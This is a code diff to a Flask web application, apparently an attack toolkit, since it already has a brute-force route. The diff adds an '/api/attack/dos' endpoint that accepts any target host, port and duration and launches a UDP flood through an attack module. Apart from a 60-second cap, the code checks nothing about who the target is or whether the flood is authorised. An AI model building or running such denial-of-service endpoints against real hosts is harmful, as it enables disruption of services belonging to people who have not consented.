@@ -106,5 +106,26 @@ def brute_force():
         traceback.print_exc()
         return jsonify({'error': f"Server Error: {str(e)}"}), 500
 
+@app.route('/api/attack/dos', methods=['POST'])
+def dos_attack():
+    data = request.json
+    target = data.get('target')
+    try:
+        port = int(data.get('port'))
+        duration = int(data.get('duration'))
+    except (ValueError, TypeError):
+        return jsonify({'error': 'Port and Duration must be integers'}), 400
+
+    if not target or not port or not duration:
+        return jsonify({'error': 'Missing required fields'}), 400
+
+    # Limit duration for safety
+    if duration > 60:
+        return jsonify({'error': 'Duration limited to 60 seconds for safety'}), 400
+
+    print(f"[DEBUG] Starting UDP Flood on {target}:{port} for {duration}s")
+    result = attack_modules.udp_flood(target, port, duration)
+    return jsonify(result)
+
 if __name__ == '__main__':
     app.run(debug=True, port=5050)
